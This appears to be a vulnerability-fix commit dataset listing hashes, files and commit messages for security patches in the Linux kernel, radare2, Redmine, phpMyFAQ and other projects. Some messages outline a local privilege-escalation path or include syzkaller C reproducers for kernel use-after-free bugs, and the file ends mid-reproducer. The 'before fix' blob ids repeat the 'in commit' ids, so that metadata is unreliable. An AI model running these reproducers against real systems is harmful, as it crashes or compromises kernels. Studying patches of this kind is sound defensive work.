Commit Message for ef8f40689ac452398026c07da41656a7c87e4683:
fix multiple memory leak in ReadYUVImage

======================================================================
Commit With Fix: 
    fbb687db1088ddd894d975996e5f6a4252b9a2b4
File(s) In Commit: 
    src/plugins/preauth/pkinit/pkinit_crypto_openssl.c
Blob(s) In Commit: 
    ac107c2c1b67dd57cfd57ba5ec07409ffdb18a29
Blob(s) Before Fix: 
    ac107c2c1b67dd57cfd57ba5ec07409ffdb18a29
Projects:
    3van_krb5
Commit Message for fbb687db1088ddd894d975996e5f6a4252b9a2b4:
Fix PKINIT cert matching data construction\n\nRewrite X509_NAME_oneline_ex() and its call sites to use dynamic allocation and to perform proper error checking.\n\nticket: 8617 target_version: 1.16 target_version: 1.15-next target_version: 1.14-next tags: pullup

======================================================================
Commit With Fix: 
    2fae9e5a7babada041e2e161699ade2447a01989
File(s) In Commit: 
    drivers/usb/misc/legousbtower.c
Blob(s) In Commit: 
    c8fbe7b739a0bb110cdfbca9e82bc7238adf5e08
Blob(s) Before Fix: 
    c8fbe7b739a0bb110cdfbca9e82bc7238adf5e08
Projects:
    0-T-0_ps4-linux
Commit Message for 2fae9e5a7babada041e2e161699ade2447a01989:
usb: misc: legousbtower: Fix NULL pointer deference\n\nThis patch fixes a NULL pointer dereference caused by a race codition in the probe function of the legousbtower driver. It re-structures the probe function to only register the interface after successfully reading the board's firmware ID.\n\nThe probe function does not deregister the usb interface after an error receiving the devices firmware ID. The device file registered (/dev/usb/legousbtower%d) may be read/written globally before the probe function returns. When tower_delete is called in the probe function (after an r/w has been initiated), core dev structures are deleted while the file operation functions are still running. If the 0 address is mappable on the machine, this vulnerability can be used to create a Local Priviege Escalation exploit via a write-what-where condition by remapping dev->interrupt_out_buffer in tower_write. A forged USB device and local program execution would be required for LPE. The USB device would have to delay the control message in tower_probe and accept the control urb in tower_open whilst guest code initiated a write to the device file as tower_delete is called from the error in tower_probe.\n\nThis bug has existed since 2003. Patch tested by emulated device.\n\nReported-by: James Patrick-Evans <james@jmp-e.com> Tested-by: James Patrick-Evans <james@jmp-e.com> Signed-off-by: James Patrick-Evans <james@jmp-e.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    07f26e213196936fb328ea0c1d5a66a09d8b5440
File(s) In Commit: 
    keycloak_httpd_client/keycloak_cli.py
Blob(s) In Commit: 
    bcbf2be82aa370482f428194bcdfd52886416fea
Blob(s) Before Fix: 
    bcbf2be82aa370482f428194bcdfd52886416fea
Projects:
    jdennis_python-keycloak
Commit Message for 07f26e213196936fb328ea0c1d5a66a09d8b5440:
CVE-2017-15111 unsafe /tmp log file in --log-file option in keycloak_cli.py\n\nkeycloak_cli.py is essentially a set of utilities used by the keycloak-httpd-client-install tool. It can be invoked on it's own, mostly for testing or to execute just one part of the Keycloak REST API. It's log file defaulted to /tmp/{prog_name}.log where prog_name is the name of the program that invoked it. That default was changed to {prog_name}.log so the log file is created in the current directory instead of under /tmp. Use of the /var/log directory was avoided because that requires root privileges.

======================================================================
Commit With Fix: 
    df80cd9b28b9ebaa284a41df611dbf3a2d05ca74
File(s) In Commit: 
    net/sctp/socket.c
Blob(s) In Commit: 
    17841ab30798ecb2d7269296dcda3c62d434d622
Blob(s) Before Fix: 
    17841ab30798ecb2d7269296dcda3c62d434d622
Projects:
    0-T-0_ps4-linux
Commit Message for df80cd9b28b9ebaa284a41df611dbf3a2d05ca74:
sctp: do not peel off an assoc from one netns to another one\n\nNow when peeling off an association to the sock in another netns, all transports in this assoc are not to be rehashed and keep use the old key in hashtable.\n\nAs a transport uses sk->net as the hash key to insert into hashtable, it would miss removing these transports from hashtable due to the new netns when closing the sock and all transports are being freeed, then later an use-after-free issue could be caused when looking up an asoc and dereferencing those transports.\n\nThis is a very old issue since very beginning, ChunYu found it with syzkaller fuzz testing with this series:\n\n  socket$inet6_sctp()   bind$inet6()   sendto$inet6()   unshare(0x40000000)   getsockopt$inet_sctp6_SCTP_GET_ASSOC_ID_LIST()   getsockopt$inet_sctp6_SCTP_SOCKOPT_PEELOFF()\n\nThis patch is to block this call when peeling one assoc off from one netns to another one, so that the netns of all transport would not go out-sync with the key in hashtable.\n\nNote that this patch didn't fix it by rehashing transports, as it's difficult to handle the situation when the tuple is already in use in the new netns. Besides, no one would like to peel off one assoc to another netns, considering ipaddrs, ifaces, etc. are usually different.\n\nReported-by: ChunYu Wang <chunwang@redhat.com> Signed-off-by: Xin Long <lucien.xin@gmail.com> Acked-by: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com> Acked-by: Neil Horman <nhorman@tuxdriver.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    1a29ed2f96da1be22fa5a4d96c7583aa81b8b060
File(s) In Commit: 
    src/lib-auth/auth-client-request.c
Blob(s) In Commit: 
    046f7c307dbf8aa060c2532e948234d3113dce43
Blob(s) Before Fix: 
    046f7c307dbf8aa060c2532e948234d3113dce43
Projects:
    001101_server
Commit Message for 1a29ed2f96da1be22fa5a4d96c7583aa81b8b060:
lib-auth: Fix memory leak in auth_client_request_abort()\n\nThis caused memory leaks when authentication was aborted. For example with IMAP:\n\na AUTHENTICATE PLAIN *\n\nBroken by 9137c55411aa39d41c1e705ddc34d5bd26c65021

======================================================================
Commit With Fix: 
    93f661d8adcfa6618b11522cdab30e97bada33fd
File(s) In Commit: 
    include/global_session.php
Blob(s) In Commit: 
    5e38729ebb2bc4b127e688f39b73b8e0c86d1b8a
Blob(s) Before Fix: 
    5e38729ebb2bc4b127e688f39b73b8e0c86d1b8a
Projects:
    3yahya_cacti
Commit Message for 93f661d8adcfa6618b11522cdab30e97bada33fd:
XSS fix (#1017)\n\nFix for issue #1010

======================================================================
Commit With Fix: 
    5649645d725c73df4302428ee4e02c869248b4c5
File(s) In Commit: 
    security/keys/keyctl.c
Blob(s) In Commit: 
    94c2790f82839adb260dc2af00907c24c5f40826
Blob(s) Before Fix: 
    94c2790f82839adb260dc2af00907c24c5f40826
Projects:
    0-T-0_ps4-linux
Commit Message for 5649645d725c73df4302428ee4e02c869248b4c5:
KEYS: fix dereferencing NULL payload with nonzero length\n\nsys_add_key() and the KEYCTL_UPDATE operation of sys_keyctl() allowed a NULL payload with nonzero length to be passed to the key type's ->preparse(), ->instantiate(), and/or ->update() methods.  Various key types including asymmetric, cifs.idmap, cifs.spnego, and pkcs7_test did not handle this case, allowing an unprivileged user to trivially cause a NULL pointer dereference (kernel oops) if one of these key types was present.  Fix it by doing the copy_from_user() when 'plen' is nonzero rather than when '_payload' is non-NULL, causing the syscall to fail with EFAULT as expected when an invalid buffer is specified.\n\nCc: stable@vger.kernel.org # 2.6.10+ Signed-off-by: Eric Biggers <ebiggers@google.com> Signed-off-by: David Howells <dhowells@redhat.com> Signed-off-by: James Morris <james.l.morris@oracle.com>

======================================================================
Commit With Fix: 
    5dde2efe0d2b3a47d17439e03acabb7ea2befb64
File(s) In Commit: 
    src/Umbraco.Web/umbraco.presentation/umbraco/dialogs/importDocumenttype.aspx.cs
Blob(s) In Commit: 
    147e7604c125ea1d9e807c4726925a813f327be3
Blob(s) Before Fix: 
    147e7604c125ea1d9e807c4726925a813f327be3
Projects:
    0Neji_Umbraco-CMS
Commit Message for 5dde2efe0d2b3a47d17439e03acabb7ea2befb64:
U4-10506 Importing a specially crafted document type file can cause XXE attack

======================================================================
Commit With Fix: 
    0b5a5258abbeaf8a0c3a18c7e753699787fdf46e
File(s) In Commit: 
    sql/event_data_objects.cc
Blob(s) In Commit: 
    90e839debb549c18b3e3fbbeeec1814ae3f575b8
Blob(s) Before Fix: 
    90e839debb549c18b3e3fbbeeec1814ae3f575b8
Projects:
    0xAX_mariadb-server
Commit Message for 0b5a5258abbeaf8a0c3a18c7e753699787fdf46e:
MW-416 DDL replication moved after acl checking\n\ngalera_events test shows a regression with the original fix for MW-416 Reason was that Events::drop_event() can be called also from inside event execution, and there we have a speacial treatment for event, which executes "DROP EVENT" statement, and runs TOI replication inside the event processing body. This resulted in executing WSREP_TO_ISOLATION two times for such DROP EVENT statement. Fix is to call WSREP_TO_ISOLATION_BEGIN only in Events::drop_event()

======================================================================
Commit With Fix: 
    90d4c44a0dd0d65c6fb3ab2417b83d700c8413ae
File(s) In Commit: 
    client-report.php
Blob(s) In Commit: 
    5387011e307b7a84ce2f9b98ec07626466427e68
Blob(s) Before Fix: 
    5387011e307b7a84ce2f9b98ec07626466427e68
Projects:
    MansM_bacula-web
Commit Message for 90d4c44a0dd0d65c6fb3ab2417b83d700c8413ae:
Ensure provided period is a valid integer and a known value\n\n  - if provided period is not an integer or a known value, we     raise an exception

======================================================================
Commit With Fix: 
    21a6f570ba33fa9f52f1bba87f07acc4e8c178f4
File(s) In Commit: 
    libr/bin/format/elf/elf.c
Blob(s) In Commit: 
    90f6acd301b5a72e061daf77af1699fe15109319
Blob(s) Before Fix: 
    90f6acd301b5a72e061daf77af1699fe15109319
Projects:
    0-T-0_radare2
Commit Message for 21a6f570ba33fa9f52f1bba87f07acc4e8c178f4:
Fix #8685 - Crash in ELF version parsing

======================================================================
Commit With Fix: 
    94f7cfbf990028348b9262578acbc53a94fce448
File(s) In Commit: 
    app/helpers/application_helper.rb
Blob(s) In Commit: 
    ef229f955388fc1786ea5266810165313e259c3f
Blob(s) Before Fix: 
    ef229f955388fc1786ea5266810165313e259c3f
Projects:
    01022012_redmine
Commit Message for 94f7cfbf990028348b9262578acbc53a94fce448:
Ensure that values of multi-value fields are HTML-escaped in issue history (#27186).\n\nPatch by Holger Just.\n\ngit-svn-id: http://svn.redmine.org/redmine/trunk@16985 e93f8b46-1217-0410-a6f0-8f06a7374b81

======================================================================
Commit With Fix: 
    56c8ee0440d8555aa7822d947ba9091c8a791508
File(s) In Commit: 
    app/helpers/queries_helper.rb
Blob(s) In Commit: 
    a4c3c3e7b3f20816be4d3fca87220dc5b6984dac
Blob(s) Before Fix: 
    a4c3c3e7b3f20816be4d3fca87220dc5b6984dac
Projects:
    01022012_redmine
Commit Message for 56c8ee0440d8555aa7822d947ba9091c8a791508:
Ensure that values of multi-value fields are HTML-escaped in issue list (#27186).\n\nPatch by Holger Just.\n\ngit-svn-id: http://svn.redmine.org/redmine/trunk@16984 e93f8b46-1217-0410-a6f0-8f06a7374b81

======================================================================
Commit With Fix: 
    1a0976417975a128b0a932ba1552c37e9414953b
File(s) In Commit: 
    app/views/timelog/_list.html.erb
Blob(s) In Commit: 
    6f126b0f7a04bf5904fa52a52edb4d4638da0b1e
Blob(s) Before Fix: 
    6f126b0f7a04bf5904fa52a52edb4d4638da0b1e
Projects:
    01022012_redmine
Commit Message for 1a0976417975a128b0a932ba1552c37e9414953b:
Don't use raw output in timelog (#27186).\n\ngit-svn-id: http://svn.redmine.org/redmine/trunk@16983 e93f8b46-1217-0410-a6f0-8f06a7374b81

======================================================================
Commit With Fix: 
    273dd9cb3bcfb1e0a0b90570b3b34eafa07d67aa
File(s) In Commit: 
    app/views/issues/_list.html.erb
Blob(s) In Commit: 
    8024a694822901ed2530fde1c9bc159343ad5abf
Blob(s) Before Fix: 
    8024a694822901ed2530fde1c9bc159343ad5abf
Projects:
    01022012_redmine
Commit Message for 273dd9cb3bcfb1e0a0b90570b3b34eafa07d67aa:
Don't use raw output (#27186).\n\ngit-svn-id: http://svn.redmine.org/redmine/trunk@16971 e93f8b46-1217-0410-a6f0-8f06a7374b81

======================================================================
Commit With Fix: 
    5c3e4f96ff0ef6b91a3f0aa64eb28197c5cf5435
File(s) In Commit: 
    phpmyfaq/admin/attachment.php
Blob(s) In Commit: 
    f1fcb0e5b6e4cee649ad18a25fe8bd8a473b5207
Blob(s) Before Fix: 
    f1fcb0e5b6e4cee649ad18a25fe8bd8a473b5207
Projects:
    14wind_phpMyFAQ
Commit Message for 5c3e4f96ff0ef6b91a3f0aa64eb28197c5cf5435:
Prevent users to upload HTML files as attachments

======================================================================
Commit With Fix: 
    cce47f94375bb0102ab4f210672231dbb854dd0d
File(s) In Commit: 
    phpmyfaq/admin/stat.ratings.php
Blob(s) In Commit: 
    2874b23d6e1dd6f5414aa8e053af78a078e3cb98
Blob(s) Before Fix: 
    2874b23d6e1dd6f5414aa8e053af78a078e3cb98
Projects:
    14wind_phpMyFAQ
Commit Message for cce47f94375bb0102ab4f210672231dbb854dd0d:
Fixed possible direct calls

======================================================================
Commit With Fix: 
    fadb9a70b5f7624a6926b8834d5c6001c210f09c
File(s) In Commit: 
    phpmyfaq/admin/stat.adminlog.php
Blob(s) In Commit: 
    5847c6060cfe7c20f7d7e2723105b23e078b2d1e
Blob(s) Before Fix: 
    5847c6060cfe7c20f7d7e2723105b23e078b2d1e
Projects:
    14wind_phpMyFAQ
Commit Message for fadb9a70b5f7624a6926b8834d5c6001c210f09c:
Added missing CSRF protection

======================================================================
Commit With Fix: 
    ec8b3cc37d05b6625e24916b8f7253f830015b5f
File(s) In Commit: 
    phpmyfaq/admin/news.php
Blob(s) In Commit: 
    1bf0657e71495cfba48050747445e4d59f776d50
Blob(s) Before Fix: 
    1bf0657e71495cfba48050747445e4d59f776d50
Projects:
    14wind_phpMyFAQ
Commit Message for ec8b3cc37d05b6625e24916b8f7253f830015b5f:
Added missing CSRF check

======================================================================
Commit With Fix: 
    fa26c52384b010edaf60c525ae5b040f05da9f77
File(s) In Commit: 
    phpmyfaq/admin/stat.main.php
Blob(s) In Commit: 
    91ed72d6e676172fc143dbb4c71a39061d9786b5
Blob(s) Before Fix: 
    91ed72d6e676172fc143dbb4c71a39061d9786b5
Projects:
    14wind_phpMyFAQ
Commit Message for fa26c52384b010edaf60c525ae5b040f05da9f77:
Added missing CSRF protection

======================================================================
Commit With Fix: 
    71bb99a02b32b4cc4265118e85f6035ca72923f0
File(s) In Commit: 
    net/bluetooth/bnep/core.c
Blob(s) In Commit: 
    ce82722d049b7c013fd06f66f726fbbf75a01f56
Blob(s) Before Fix: 
    ce82722d049b7c013fd06f66f726fbbf75a01f56
Projects:
    0-T-0_ps4-linux
Commit Message for 71bb99a02b32b4cc4265118e85f6035ca72923f0:
Bluetooth: bnep: bnep_add_connection() should verify that it's dealing with l2cap socket\n\nsame story as cmtp\n\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk> Signed-off-by: Marcel Holtmann <marcel@holtmann.org>

======================================================================
Commit With Fix: 
    a6981567e8e215acc1ef690c8dbb30f2d9b00a19
File(s) In Commit: 
    usr.bin/ssh/sftp-server.c
Blob(s) In Commit: 
    42249ebd60d0f46a2219d61203a30e0da65d38ec
Blob(s) Before Fix: 
    42249ebd60d0f46a2219d61203a30e0da65d38ec
Projects:
    Luigi30_src
Commit Message for a6981567e8e215acc1ef690c8dbb30f2d9b00a19:
disallow creation (of empty files) in read-only mode  reported by Michal Zalewski, feedback & ok deraadt@

======================================================================
Commit With Fix: 
    c6d0076c924891ad9948a62d89d0bcdaf965f0cd
File(s) In Commit: 
    libr/bin/format/elf/elf.c
Blob(s) In Commit: 
    e3c852fd33de239204f4b3680c77fa525b493b13
Blob(s) Before Fix: 
    e3c852fd33de239204f4b3680c77fa525b493b13
Projects:
    0-T-0_radare2
Commit Message for c6d0076c924891ad9948a62d89d0bcdaf965f0cd:
Fix #8731 - Crash in ELF parser with negative 32bit number

======================================================================
Commit With Fix: 
    44ded3ff35b8264f54b5a900cab32ec489d9e5b9
File(s) In Commit: 
    libr/bin/format/elf/elf.c
Blob(s) In Commit: 
    2248731b38a2cdb53b3ef9c8563fd8ec3f08e8fc
Blob(s) Before Fix: 
    2248731b38a2cdb53b3ef9c8563fd8ec3f08e8fc
Projects:
    0-T-0_radare2
Commit Message for 44ded3ff35b8264f54b5a900cab32ec489d9e5b9:
Fix #8743 - Crash in ELF version parser on 32bit systems

======================================================================
Commit With Fix: 
    4043718264095cde6623c2cbe8c644541036d7bf
File(s) In Commit: 
    src/agent/Core/SpawningKit/Spawner.h
Blob(s) In Commit: 
    99dedb852f581ce4b533a79e93a3e33deff93fc3
Blob(s) Before Fix: 
    99dedb852f581ce4b533a79e93a3e33deff93fc3
Projects:
    10thfloor_passenger
Commit Message for 4043718264095cde6623c2cbe8c644541036d7bf:
Disable unused feature.

======================================================================
Commit With Fix: 
    0b973e28166636e0ff1fad80baa0385c9c09c53a
File(s) In Commit: 
    libr/bin/format/elf/elf.c
Blob(s) In Commit: 
    b466c312cba492863d5f00d128f61603cecafe9d
Blob(s) Before Fix: 
    b466c312cba492863d5f00d128f61603cecafe9d
Projects:
    0-T-0_radare2
Commit Message for 0b973e28166636e0ff1fad80baa0385c9c09c53a:
Fixed crash in elf.c with 32bit r2 when shdr->sh_size > max size_t

======================================================================
Commit With Fix: 
    d31c4d3cbdbe01ea3ded16a584de94149ecd31d9
File(s) In Commit: 
    libr/bin/bin.c
Blob(s) In Commit: 
    b5fffe88bc3e9f5ee64dbd0114b799a9a68acee7
Blob(s) Before Fix: 
    b5fffe88bc3e9f5ee64dbd0114b799a9a68acee7
Projects:
    0-T-0_radare2
Commit Message for d31c4d3cbdbe01ea3ded16a584de94149ecd31d9:
Fix #8748 - Fix oobread on string search

======================================================================
Commit With Fix: 
    cd4663dc80323ba64989d0c103d51ad3ee0e9c2f
File(s) In Commit: 
    libavcodec/smacker.c
Blob(s) In Commit: 
    7deccffa5497265c66d1ee5ed8acf04bacfee575
Blob(s) Before Fix: 
    7deccffa5497265c66d1ee5ed8acf04bacfee575
Projects:
    00ERNEST00_FFmpeg
Commit Message for cd4663dc80323ba64989d0c103d51ad3ee0e9c2f:
smacker: add sanity check for length in smacker_decode_tree()\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n\nBug-Id: 1098 Cc: libav-stable@libav.org Signed-off-by: Sean McGovern <gseanmcg@gmail.com>

======================================================================
Commit With Fix: 
    d16c24542b2f96a194d43a73c2e5778822b9cb47
File(s) In Commit: 
    src/snmp.c
Blob(s) In Commit: 
    6e26ad59da4b2b05da4e8813754392fa66d3c43e
Blob(s) Before Fix: 
    6e26ad59da4b2b05da4e8813754392fa66d3c43e
Projects:
    01BTC10_collectd
Commit Message for d16c24542b2f96a194d43a73c2e5778822b9cb47:
snmp plugin: Fix double free of request PDU\n\nsnmp_sess_synch_response() always frees request PDU, in both case of request error and success. If error condition occurs inside of `while (status == 0)` loop, double free of `req` happens.\n\nIssue: #2291 Signed-off-by: Florian Forster <octo@collectd.org>

======================================================================
Commit With Fix: 
    5f06d724bc05580e7f203db2d4a4905fc1127f98
File(s) In Commit: 
    mistune.py
Blob(s) In Commit: 
    5b05fcb3658ad7bdee0301ac54dda7abc52d1ee7
Blob(s) Before Fix: 
    5b05fcb3658ad7bdee0301ac54dda7abc52d1ee7
Projects:
    0wave_mistune
Commit Message for 5f06d724bc05580e7f203db2d4a4905fc1127f98:
Fix CVE-2017-16876

======================================================================
Commit With Fix: 
    c16791d28d1ca3139e398145f0c6565c523c291a
File(s) In Commit: 
    src/Whoops/Util/TemplateHelper.php
Blob(s) In Commit: 
    00f6ae499eaf656a76546804623cd7bfc21526e7
Blob(s) Before Fix: 
    00f6ae499eaf656a76546804623cd7bfc21526e7
Projects:
    2bj_whoops
Commit Message for c16791d28d1ca3139e398145f0c6565c523c291a:
TemplateHelper: fix XSS if Symfony dumper is not available

======================================================================
Commit With Fix: 
    09d90141292f9ec516a7a2007bf828ce2bbdf60d
File(s) In Commit: 
    lib/Event.php
Blob(s) In Commit: 
    462f90b2206ba2117591ac394a986054d7007517
Blob(s) Before Fix: 
    462f90b2206ba2117591ac394a986054d7007517
Projects:
    horde_kronolith
Commit Message for 09d90141292f9ec516a7a2007bf828ce2bbdf60d:
Bug: 14857\n\nPrevent XSS in event's URL field.

======================================================================
Commit With Fix: 
    fb2113bbcd04bd4a28c46aad0889fb0a3979a230
File(s) In Commit: 
    lib/View/Sidebar.php
Blob(s) In Commit: 
    fed0734b410c337436b4a199f776c3e6f5d7c4ed
Blob(s) Before Fix: 
    fed0734b410c337436b4a199f776c3e6f5d7c4ed
Projects:
    horde_base
Commit Message for fb2113bbcd04bd4a28c46aad0889fb0a3979a230:
Bug: 14857\n\nEscape user supplied color data, preventing XSS vuln.

======================================================================
Commit With Fix: 
    39f740068ad21618f6f70b6e37855c61cadbd716
File(s) In Commit: 
    js/kronolith.js
Blob(s) In Commit: 
    d3b19dbf82498a01eb4d85ca938101b73163e46d
Blob(s) Before Fix: 
    d3b19dbf82498a01eb4d85ca938101b73163e46d
Projects:
    horde_kronolith
Commit Message for 39f740068ad21618f6f70b6e37855c61cadbd716:
Bug: 14857\n\nEscape user-provided resource name when outputting. Prevents XSS vuln.

======================================================================
Commit With Fix: 
    7d5890b2fc63285f010d5845913894dd71cf232c
File(s) In Commit: 
    app/Controller/UsersController.php
Blob(s) In Commit: 
    431736113bdd01a2589f61e51454bf074c23d295
Blob(s) Before Fix: 
    431736113bdd01a2589f61e51454bf074c23d295
Projects:
    0-vortex_MISP
Commit Message for 7d5890b2fc63285f010d5845913894dd71cf232c:
fix: Leaking of hashed passwords in the audit logs fixed\n\n- Scope was limited due to the audit log access restrictions to site/org admins

======================================================================
Commit With Fix: 
    373c4557d2aa362702c4c2d41288fb1e54990b7c
File(s) In Commit: 
    mm/pagewalk.c
Blob(s) In Commit: 
    23a3e415ac2ce592bc0e7e21f3deb957e89dff7f
Blob(s) Before Fix: 
    23a3e415ac2ce592bc0e7e21f3deb957e89dff7f
Projects:
    0-T-0_ps4-linux
Commit Message for 373c4557d2aa362702c4c2d41288fb1e54990b7c:
mm/pagewalk.c: report holes in hugetlb ranges\n\nThis matters at least for the mincore syscall, which will otherwise copy uninitialized memory from the page allocator to userspace.  It is probably also a correctness error for /proc/$pid/pagemap, but I haven't tested that.\n\nRemoving the `walk->hugetlb_entry` condition in walk_hugetlb_range() has no effect because the caller already checks for that.\n\nThis only reports holes in hugetlb ranges to callers who have specified a hugetlb_entry callback.\n\nThis issue was found using an AFL-based fuzzer.\n\nv2:  - don't crash on ->pte_hole==NULL (Andrew Morton)  - add Cc stable (Andrew Morton)\n\nFixes: 1e25a271c8ac ("mincore: apply page table walker on do_mincore()") Signed-off-by: Jann Horn <jannh@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    2b7e8665b4ff51c034c55df3cff76518d1a9ee3a
File(s) In Commit: 
    kernel/fork.c
Blob(s) In Commit: 
    cbbea277b3fba7a8a1ff73ffaf620202a706036a
Blob(s) Before Fix: 
    cbbea277b3fba7a8a1ff73ffaf620202a706036a
Projects:
    0-T-0_ps4-linux
Commit Message for 2b7e8665b4ff51c034c55df3cff76518d1a9ee3a:
fork: fix incorrect fput of ->exe_file causing use-after-free\n\nCommit 7c051267931a ("mm, fork: make dup_mmap wait for mmap_sem for write killable") made it possible to kill a forking task while it is waiting to acquire its ->mmap_sem for write, in dup_mmap().\n\nHowever, it was overlooked that this introduced an new error path before a reference is taken on the mm_struct's ->exe_file.  Since the ->exe_file of the new mm_struct was already set to the old ->exe_file by the memcpy() in dup_mm(), it was possible for the mmput() in the error path of dup_mm() to drop a reference to ->exe_file which was never taken.\n\nThis caused the struct file to later be freed prematurely.\n\nFix it by updating mm_init() to NULL out the ->exe_file, in the same place it clears other things like the list of mmaps.\n\nThis bug was found by syzkaller.  It can be reproduced using the following C program:\n\n    #define _GNU_SOURCE     #include <pthread.h>     #include <stdlib.h>     #include <sys/mman.h>     #include <sys/syscall.h>     #include <sys/wait.h>     #include <unistd.h>\n\n    static void *mmap_thread(void *_arg)     {         for (  ) {             mmap(NULL, 0x1000000, PROT_READ,                  MAP_POPULATE|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0)          }     }\n\n    static void *fork_thread(void *_arg)     {         usleep(rand() % 10000)          fork()      }\n\n    int main(void)     {         fork()          fork()          fork()          for (  ) {             if (fork() == 0) {                 pthread_t t \n\n                pthread_create(&t, NULL, mmap_thread, NULL)                  pthread_create(&t, NULL, fork_thread, NULL)                  usleep(rand() % 10000)                  syscall(__NR_exit_group, 0)              }             wait(NULL)          }     }\n\nNo special kernel config options are needed.  It usually causes a NULL pointer dereference in __remove_shared_vm_struct() during exit, or in dup_mmap() (which is usually inlined into copy_process()) during fork. Both are due to a vm_area_struct's ->vm_file being used after it's already been freed.\n\nGoogle Bug Id: 64772007\n\nLink: http://lkml.kernel.org/r/20170823211408.31198-1-ebiggers3@gmail.com Fixes: 7c051267931a ("mm, fork: make dup_mmap wait for mmap_sem for write killable") Signed-off-by: Eric Biggers <ebiggers@google.com> Tested-by: Mark Rutland <mark.rutland@arm.com> Acked-by: Michal Hocko <mhocko@suse.com> Cc: Dmitry Vyukov <dvyukov@google.com> Cc: Ingo Molnar <mingo@kernel.org> Cc: Konstantin Khlebnikov <koct9i@gmail.com> Cc: Oleg Nesterov <oleg@redhat.com> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Vlastimil Babka <vbabka@suse.cz> Cc: <stable@vger.kernel.org>	[v4.7+] Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    ccd5b3235180eef3cfec337df1c8554ab151b5cc
File(s) In Commit: 
    arch/x86/include/asm/mmu_context.h
Blob(s) In Commit: 
    7a234be7e29846618cbdafb0153705cb8a8566b3
Blob(s) Before Fix: 
    7a234be7e29846618cbdafb0153705cb8a8566b3
Projects:
    0-T-0_ps4-linux
Commit Message for ccd5b3235180eef3cfec337df1c8554ab151b5cc:
x86/mm: Fix use-after-free of ldt_struct\n\nThe following commit:\n\n  39a0526fb3f7 ("x86/mm: Factor out LDT init from context init")\n\nrenamed init_new_context() to init_new_context_ldt() and added a new init_new_context() which calls init_new_context_ldt().  However, the error code of init_new_context_ldt() was ignored.  Consequently, if a memory allocation in alloc_ldt_struct() failed during a fork(), the ->context.ldt of the new task remained the same as that of the old task (due to the memcpy() in dup_mm()).  ldt_struct's are not intended to be shared, so a use-after-free occurred after one task exited.\n\nFix the bug by making init_new_context() pass through the error code of init_new_context_ldt().\n\nThis bug was found by syzkaller, which encountered the following splat:\n\n    BUG: KASAN: use-after-free in free_ldt_struct.part.2+0x10a/0x150 arch/x86/kernel/ldt.c:116     Read of size 4 at addr ffff88006d2cb7c8 by task kworker/u9:0/3710\n\n    CPU: 1 PID: 3710 Comm: kworker/u9:0 Not tainted 4.13.0-rc4-next-20170811 #2     Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01/01/2011     Call Trace:      __dump_stack lib/dump_stack.c:16 [inline]      dump_stack+0x194/0x257 lib/dump_stack.c:52      print_address_description+0x73/0x250 mm/kasan/report.c:252      kasan_report_error mm/kasan/report.c:351 [inline]      kasan_report+0x24e/0x340 mm/kasan/report.c:409      __asan_report_load4_noabort+0x14/0x20 mm/kasan/report.c:429      free_ldt_struct.part.2+0x10a/0x150 arch/x86/kernel/ldt.c:116      free_ldt_struct arch/x86/kernel/ldt.c:173 [inline]      destroy_context_ldt+0x60/0x80 arch/x86/kernel/ldt.c:171      destroy_context arch/x86/include/asm/mmu_context.h:157 [inline]      __mmdrop+0xe9/0x530 kernel/fork.c:889      mmdrop include/linux/sched/mm.h:42 [inline]      exec_mmap fs/exec.c:1061 [inline]      flush_old_exec+0x173c/0x1ff0 fs/exec.c:1291      load_elf_binary+0x81f/0x4ba0 fs/binfmt_elf.c:855      search_binary_handler+0x142/0x6b0 fs/exec.c:1652      exec_binprm fs/exec.c:1694 [inline]      do_execveat_common.isra.33+0x1746/0x22e0 fs/exec.c:1816      do_execve+0x31/0x40 fs/exec.c:1860      call_usermodehelper_exec_async+0x457/0x8f0 kernel/umh.c:100      ret_from_fork+0x2a/0x40 arch/x86/entry/entry_64.S:431\n\n    Allocated by task 3700:      save_stack_trace+0x16/0x20 arch/x86/kernel/stacktrace.c:59      save_stack+0x43/0xd0 mm/kasan/kasan.c:447      set_track mm/kasan/kasan.c:459 [inline]      kasan_kmalloc+0xad/0xe0 mm/kasan/kasan.c:551      kmem_cache_alloc_trace+0x136/0x750 mm/slab.c:3627      kmalloc include/linux/slab.h:493 [inline]      alloc_ldt_struct+0x52/0x140 arch/x86/kernel/ldt.c:67      write_ldt+0x7b7/0xab0 arch/x86/kernel/ldt.c:277      sys_modify_ldt+0x1ef/0x240 arch/x86/kernel/ldt.c:307      entry_SYSCALL_64_fastpath+0x1f/0xbe\n\n    Freed by task 3700:      save_stack_trace+0x16/0x20 arch/x86/kernel/stacktrace.c:59      save_stack+0x43/0xd0 mm/kasan/kasan.c:447      set_track mm/kasan/kasan.c:459 [inline]      kasan_slab_free+0x71/0xc0 mm/kasan/kasan.c:524      __cache_free mm/slab.c:3503 [inline]      kfree+0xca/0x250 mm/slab.c:3820      free_ldt_struct.part.2+0xdd/0x150 arch/x86/kernel/ldt.c:121      free_ldt_struct arch/x86/kernel/ldt.c:173 [inline]      destroy_context_ldt+0x60/0x80 arch/x86/kernel/ldt.c:171      destroy_context arch/x86/include/asm/mmu_context.h:157 [inline]      __mmdrop+0xe9/0x530 kernel/fork.c:889      mmdrop include/linux/sched/mm.h:42 [inline]      __mmput kernel/fork.c:916 [inline]      mmput+0x541/0x6e0 kernel/fork.c:927      copy_process.part.36+0x22e1/0x4af0 kernel/fork.c:1931      copy_process kernel/fork.c:1546 [inline]      _do_fork+0x1ef/0xfb0 kernel/fork.c:2025      SYSC_clone kernel/fork.c:2135 [inline]      SyS_clone+0x37/0x50 kernel/fork.c:2129      do_syscall_64+0x26c/0x8c0 arch/x86/entry/common.c:287      return_from_SYSCALL_64+0x0/0x7a\n\nHere is a C reproducer:\n\n    #include <asm/ldt.h>     #include <pthread.h>     #include 